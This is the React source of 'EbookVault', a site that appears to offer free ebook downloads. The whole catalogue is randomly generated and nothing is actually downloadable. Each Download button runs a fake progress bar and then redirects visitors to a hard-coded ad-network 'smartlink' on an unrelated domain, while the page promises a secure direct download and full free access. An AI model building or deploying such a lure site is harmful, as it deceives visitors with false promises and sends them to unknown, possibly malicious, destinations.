/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useMemo } from 'react';
import { Download, FileText, BookOpen, Layers, CheckCircle2, Loader2, ChevronRight, Mail, Info, ShieldAlert, HelpCircle, Menu, X } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// --- Types ---
interface EbookData {
  id: string;
  theme: string;
  title: string;
  description: string;
  coverSeed: string;
  fileSize: string;
  format: string;
  pages: number;
}

type Page = 'home' | 'browse' | 'categories' | 'support';

// --- Constants ---
const THEMES = [
  {
    name: 'Business',
    titles: ['The Modern Entrepreneur', 'Scaling Beyond Limits', 'Capital Mastery', 'The Art of the Deal 2.0'],
    descriptions: ['Learn the essential strategies for building a sustainable business in the digital age.', 'A comprehensive guide to modern management and venture capital.', 'Master the psychological aspects of negotiation and market dominance.']
  },
  {
    name: 'Crypto',
    titles: ['Blockchain Revolution', 'The Bitcoin Standard', 'DeFi Deep Dive', 'NFTs and the Future of Art'],
    descriptions: ['Understand the underlying technology that is reshaping the global financial system.', 'A deep dive into decentralized finance and the future of digital assets.', 'Everything you need to know about the crypto market and smart contracts.']
  },
  {
    name: 'Artificial Intelligence',
    titles: ['Neural Networks Simplified', 'The AI Advantage', 'Prompt Engineering Mastery', 'Generative Future'],
    descriptions: ['Demystifying complex AI concepts for the modern professional.', 'How to leverage machine learning to gain a competitive edge in any industry.', 'A practical guide to the tools and techniques of the AI revolution.']
  },
  {
    name: 'Marketing',
    titles: ['Growth Hacking Secrets', 'Digital Marketing 101', 'The Viral Formula', 'Brand Identity Design'],
    descriptions: ['Unconventional marketing strategies used by the world\'s fastest-growing startups.', 'Master the art of digital storytelling and customer acquisition.', 'Build a brand that resonates and stands the test of time.']
  },
  {
    name: 'Self Improvement',
    titles: ['The Power of Habit', 'Mindset Shift', 'Atomic Productivity', 'The Stoic Path'],
    descriptions: ['Transform your life by mastering the small actions that lead to big results.', 'Overcome mental blocks and unlock your full potential.', 'Practical wisdom for finding peace and purpose in a chaotic world.']
  },
  {
    name: 'Finance',
    titles: ['Wealth Building 101', 'Retirement Planning', 'Stock Market Mastery', 'Personal Finance Guide'],
    descriptions: ['A step-by-step guide to achieving financial independence.', 'Secure your future with smart investment strategies.', 'Master the fundamentals of the stock market and wealth creation.']
  },
  {
    name: 'Health',
    titles: ['The Longevity Code', 'Biohacking Your Body', 'Nutritional Science', 'Mental Wellness Guide'],
    descriptions: ['Scientific approaches to living a longer, healthier life.', 'Optimize your physical and mental performance through biohacking.', 'A comprehensive guide to nutrition and holistic health.']
  },
  {
    name: 'Technology',
    titles: ['The Future of Web3', 'Cybersecurity Essentials', 'Cloud Computing Guide', 'Quantum Computing 101'],
    descriptions: ['Explore the next generation of the internet and decentralized systems.', 'Protect your digital life with essential cybersecurity practices.', 'A deep dive into the technologies shaping our digital future.']
  }
];

const FORMATS = ['PDF', 'EPUB', 'ZIP'];
const SMARTLINK = 'https://acceptancesuicidegel.com/bn7gqsyptx?key=4abac9f116b492137f2b497500b2d9fa';

// --- Helper Functions ---
const getRandomItem = <T,>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
const getRandomInRange = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;

const generateEbook = (forcedTheme?: string): EbookData => {
  const themeObj = forcedTheme 
    ? THEMES.find(t => t.name === forcedTheme) || THEMES[0]
    : getRandomItem(THEMES);
    
  return {
    id: Math.random().toString(36).substring(7),
    theme: themeObj.name,
    title: getRandomItem(themeObj.titles),
    description: getRandomItem(themeObj.descriptions),
    coverSeed: Math.random().toString(36).substring(7),
    fileSize: `${(Math.random() * (15 - 2) + 2).toFixed(1)} MB`,
    format: getRandomItem(FORMATS),
    pages: getRandomInRange(120, 450)
  };
};

// --- Shared Components ---

const DownloadButton = ({ className = "", size = "md" }: { className?: string, size?: "sm" | "md" | "lg" }) => {
  const [isDownloading, setIsDownloading] = useState(false);
  const [progress, setProgress] = useState(0);

  const handleDownload = () => {
    setIsDownloading(true);
    let p = 0;
    const interval = setInterval(() => {
      p += 10;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => {
          window.location.href = SMARTLINK;
        }, 500);
      }
    }, 150);
  };

  const sizeClasses = {
    sm: "px-4 py-2 text-sm rounded-lg",
    md: "px-8 py-4 text-base rounded-xl",
    lg: "px-12 py-5 text-lg rounded-2xl"
  };

  return (
    <button
      onClick={handleDownload}
      disabled={isDownloading}
      className={`
        relative font-bold transition-all duration-300 flex items-center justify-center gap-2
        ${isDownloading 
          ? 'bg-gray-100 text-gray-400 cursor-not-allowed' 
          : 'bg-blue-600 text-white hover:bg-blue-700 hover:shadow-lg shadow-blue-100'}
        ${sizeClasses[size]}
        ${className}
      `}
    >
      <AnimatePresence mode="wait">
        {isDownloading ? (
          <motion.div 
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex items-center gap-2"
          >
            <Loader2 className="w-4 h-4 animate-spin" />
            {progress}%
          </motion.div>
        ) : (
          <motion.div 
            key="idle"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex items-center gap-2"
          >
            Download
            <Download className="w-4 h-4" />
          </motion.div>
        )}
      </AnimatePresence>
    </button>
  );
};

const EbookCard = ({ ebook }: { ebook: EbookData }) => (
  <motion.div 
    layout
    initial={{ opacity: 0, scale: 0.95 }}
    animate={{ opacity: 1, scale: 1 }}
    className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden group hover:shadow-md transition-shadow"
  >
    <div className="aspect-[3/4] relative overflow-hidden">
      <img 
        src={`https://picsum.photos/seed/${ebook.coverSeed}/400/600`} 
        alt={ebook.title}
        className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
        referrerPolicy="no-referrer"
      />
      <div className="absolute top-3 left-3">
        <span className="px-2 py-1 bg-white/90 backdrop-blur-sm text-[10px] font-bold uppercase tracking-wider rounded-md text-blue-600">
          {ebook.theme}
        </span>
      </div>
    </div>
    <div className="p-5 space-y-3">
      <h3 className="font-bold text-lg leading-tight line-clamp-1">{ebook.title}</h3>
      <p className="text-sm text-gray-500 line-clamp-2">{ebook.description}</p>
      <div className="flex items-center justify-between pt-2">
        <div className="text-[10px] text-gray-400 uppercase font-bold tracking-widest">
          {ebook.format} • {ebook.pages} Pages
        </div>
        <DownloadButton size="sm" />
      </div>
    </div>
  </motion.div>
);

// --- View Components ---

const HomeView = ({ ebook }: { ebook: EbookData }) => (
  <div className="grid md:grid-cols-2 gap-12 md:gap-24 items-center">
    <motion.div 
      initial={{ opacity: 0, x: -20 }}
      animate={{ opacity: 1, x: 0 }}
      className="relative group"
    >
      <div className="absolute -inset-4 bg-blue-100 rounded-3xl blur-2xl opacity-50 group-hover:opacity-70 transition-opacity duration-500"></div>
      <div className="relative aspect-[3/4] w-full max-w-md mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
        <img 
          src={`https://picsum.photos/seed/${ebook.coverSeed}/800/1200`} 
          alt={ebook.title}
          className="w-full h-full object-cover"
          referrerPolicy="no-referrer"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent flex flex-col justify-end p-8 text-white">
          <span className="text-xs font-bold uppercase tracking-widest mb-2 text-blue-400">{ebook.theme}</span>
          <h2 className="text-2xl font-bold leading-tight">{ebook.title}</h2>
        </div>
      </div>
    </motion.div>

    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.2 }}
      className="space-y-8"
    >
      <div className="space-y-4">
        <span className="inline-block px-3 py-1 bg-blue-50 text-blue-600 text-xs font-bold rounded-full uppercase tracking-wider">
          Featured Release
        </span>
        <h1 className="text-4xl md:text-6xl font-bold tracking-tight leading-[1.1]">
          {ebook.title}
        </h1>
        <p className="text-lg text-gray-600 leading-relaxed max-w-xl">
          {ebook.description}
        </p>
      </div>

      <div className="grid grid-cols-3 gap-4">
        {[
          { label: 'Format', val: ebook.format, icon: Layers },
          { label: 'Pages', val: ebook.pages, icon: FileText },
          { label: 'Size', val: ebook.fileSize, icon: Download }
        ].map((item, i) => (
          <div key={i} className="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
            <div className="flex items-center gap-2 text-gray-400 mb-1">
              <item.icon className="w-4 h-4" />
              <span className="text-[10px] uppercase font-bold tracking-wider">{item.label}</span>
            </div>
            <p className="font-bold">{item.val}</p>
          </div>
        ))}
      </div>

      <ul className="space-y-3">
        {['Full access included', 'High-quality illustrations', 'Compatible with all devices'].map((feature, i) => (
          <li key={i} className="flex items-center gap-2 text-sm text-gray-600">
            <CheckCircle2 className="w-4 h-4 text-green-500" />
            {feature}
          </li>
        ))}
      </ul>

      <div className="pt-4">
        <DownloadButton size="lg" className="w-full md:w-auto" />
        <p className="mt-4 text-xs text-gray-400 text-center md:text-left">
          No registration required. Secure direct download.
        </p>
      </div>
    </motion.div>
  </div>
);

const BrowseView = () => {
  const ebooks = useMemo(() => Array.from({ length: 12 }, () => generateEbook()), []);
  
  return (
    <div className="space-y-12">
      <div className="text-center space-y-4">
        <h1 className="text-4xl font-bold tracking-tight">Browse Library</h1>
        <p className="text-gray-500">Explore our curated collection of premium ebooks.</p>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
        {ebooks.map(ebook => (
          <div key={ebook.id}>
            <EbookCard ebook={ebook} />
          </div>
        ))}
      </div>
    </div>
  );
};

const CategoriesView = () => {
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
  const ebooks = useMemo(() => {
    if (!selectedCategory) return [];
    return Array.from({ length: 8 }, () => generateEbook(selectedCategory));
  }, [selectedCategory]);

  return (
    <div className="space-y-12">
      <div className="text-center space-y-4">
        <h1 className="text-4xl font-bold tracking-tight">Categories</h1>
        <p className="text-gray-500">Find exactly what you're looking for by category.</p>
      </div>
      
      <div className="flex flex-wrap justify-center gap-3">
        {THEMES.map(theme => (
          <button
            key={theme.name}
            onClick={() => setSelectedCategory(theme.name)}
            className={`
              px-6 py-3 rounded-full font-bold text-sm transition-all
              ${selectedCategory === theme.name 
                ? 'bg-blue-600 text-white shadow-lg shadow-blue-200' 
                : 'bg-white text-gray-600 border border-gray-100 hover:border-blue-200 hover:text-blue-600'}
            `}
          >
            {theme.name}
          </button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {selectedCategory ? (
          <motion.div 
            key={selectedCategory}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"
          >
            {ebooks.map(ebook => (
              <div key={ebook.id}>
                <EbookCard ebook={ebook} />
              </div>
            ))}
          </motion.div>
        ) : (
          <div className="text-center py-24 text-gray-400">
            <BookOpen className="w-12 h-12 mx-auto mb-4 opacity-20" />
            <p>Select a category to view ebooks</p>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const SupportView = () => (
  <div className="max-w-3xl mx-auto space-y-16">
    <div className="text-center space-y-4">
      <h1 className="text-4xl font-bold tracking-tight">Support Center</h1>
      <p className="text-gray-500">How can we help you today?</p>
    </div>

    <section className="space-y-6">
      <div className="flex items-center gap-3 text-blue-600">
        <HelpCircle className="w-6 h-6" />
        <h2 className="text-xl font-bold">Frequently Asked Questions</h2>
      </div>
      <div className="space-y-4">
        {[
          { q: "Is it really free?", a: "Yes, all ebooks on our platform are provided free of charge for educational purposes." },
          { q: "Do I need an account?", a: "No, you can download any ebook directly without registration." },
          { q: "What formats are available?", a: "We provide ebooks in PDF, EPUB, and ZIP formats for maximum compatibility." }
        ].map((faq, i) => (
          <div key={i} className="bg-white p-6 rounded-2xl border border-gray-100 shadow-sm">
            <h3 className="font-bold mb-2">{faq.q}</h3>
            <p className="text-sm text-gray-500 leading-relaxed">{faq.a}</p>
          </div>
        ))}
      </div>
    </section>

    <div className="grid md:grid-cols-2 gap-8">
      <section className="bg-white p-8 rounded-3xl border border-gray-100 shadow-sm space-y-4">
        <div className="flex items-center gap-3 text-blue-600">
          <Mail className="w-6 h-6" />
          <h2 className="text-xl font-bold">Contact Us</h2>
        </div>
        <p className="text-sm text-gray-500">Have questions or feedback? Reach out to our team.</p>
        <p className="font-bold text-blue-600">support@ebookvault.dummy</p>
      </section>

      <section className="bg-white p-8 rounded-3xl border border-gray-100 shadow-sm space-y-4">
        <div className="flex items-center gap-3 text-blue-600">
          <Info className="w-6 h-6" />
          <h2 className="text-xl font-bold">About Us</h2>
        </div>
        <p className="text-sm text-gray-500 leading-relaxed">
          EbookVault is a minimalist platform dedicated to providing high-quality educational resources to everyone, everywhere.
        </p>
      </section>
    </div>

    <section className="bg-amber-50 p-8 rounded-3xl border border-amber-100 space-y-4">
      <div className="flex items-center gap-3 text-amber-600">
        <ShieldAlert className="w-6 h-6" />
        <h2 className="text-xl font-bold">Disclaimer</h2>
      </div>
      <p className="text-sm text-amber-800/70 leading-relaxed">
        This website provides free ebooks for educational purposes. We do not host any copyrighted material on our servers. All content is generated or linked for informational use only.
      </p>
    </section>
  </div>
);

// --- Main App ---

export default function App() {
  const [currentPage, setCurrentPage] = useState<Page>('home');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [featuredEbook, setFeaturedEbook] = useState<EbookData | null>(null);

  useEffect(() => {
    setFeaturedEbook(generateEbook());
    window.scrollTo(0, 0);
  }, [currentPage]);

  const navItems: { id: Page, label: string }[] = [
    { id: 'home', label: 'Home' },
    { id: 'browse', label: 'Browse' },
    { id: 'categories', label: 'Categories' },
    { id: 'support', label: 'Support' }
  ];

  if (!featuredEbook) return null;

  return (
    <div className="min-h-screen bg-[#F8F9FA] text-[#1A1A1A] font-sans selection:bg-blue-100">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-100">
        <nav className="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
          <div 
            className="flex items-center gap-2 font-bold text-xl tracking-tight cursor-pointer"
            onClick={() => setCurrentPage('home')}
          >
            <BookOpen className="w-6 h-6 text-blue-600" />
            <span>EbookVault</span>
          </div>

          {/* Desktop Nav */}
          <div className="hidden md:flex gap-8 text-sm font-medium">
            {navItems.map(item => (
              <button
                key={item.id}
                onClick={() => setCurrentPage(item.id)}
                className={`transition-colors ${currentPage === item.id ? 'text-blue-600' : 'text-gray-500 hover:text-blue-600'}`}
              >
                {item.label}
              </button>
            ))}
          </div>

          {/* Mobile Menu Toggle */}
          <button className="md:hidden p-2" onClick={() => setIsMenuOpen(!isMenuOpen)}>
            {isMenuOpen ? <X /> : <Menu />}
          </button>
        </nav>

        {/* Mobile Nav */}
        <AnimatePresence>
          {isMenuOpen && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="md:hidden bg-white border-b border-gray-100 overflow-hidden"
            >
              <div className="px-6 py-8 flex flex-col gap-6">
                {navItems.map(item => (
                  <button
                    key={item.id}
                    onClick={() => {
                      setCurrentPage(item.id);
                      setIsMenuOpen(false);
                    }}
                    className={`text-lg font-bold flex items-center justify-between ${currentPage === item.id ? 'text-blue-600' : 'text-gray-500'}`}
                  >
                    {item.label}
                    <ChevronRight className="w-5 h-5" />
                  </button>
                ))}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-6 py-12 md:py-24">
        <AnimatePresence mode="wait">
          <motion.div
            key={currentPage}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.3 }}
          >
            {currentPage === 'home' && <HomeView ebook={featuredEbook} />}
            {currentPage === 'browse' && <BrowseView />}
            {currentPage === 'categories' && <CategoriesView />}
            {currentPage === 'support' && <SupportView />}
          </motion.div>
        </AnimatePresence>
      </main>

      {/* Footer */}
      <footer className="mt-24 border-t border-gray-100 py-12 bg-white">
        <div className="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-8">
          <div className="flex items-center gap-2 font-bold text-lg opacity-50">
            <BookOpen className="w-5 h-5" />
            <span>EbookVault</span>
          </div>
          <p className="text-sm text-gray-400">© 2026 EbookVault. All rights reserved.</p>
          <div className="flex gap-6 text-xs font-medium text-gray-400">
            <button onClick={() => setCurrentPage('support')} className="hover:text-gray-600 transition-colors">Privacy Policy</button>
            <button onClick={() => setCurrentPage('support')} className="hover:text-gray-600 transition-colors">Terms of Service</button>
            <button onClick={() => setCurrentPage('support')} className="hover:text-gray-600 transition-colors">DMCA</button>
          </div>
        </div>
      </footer>
    </div>
  );
}
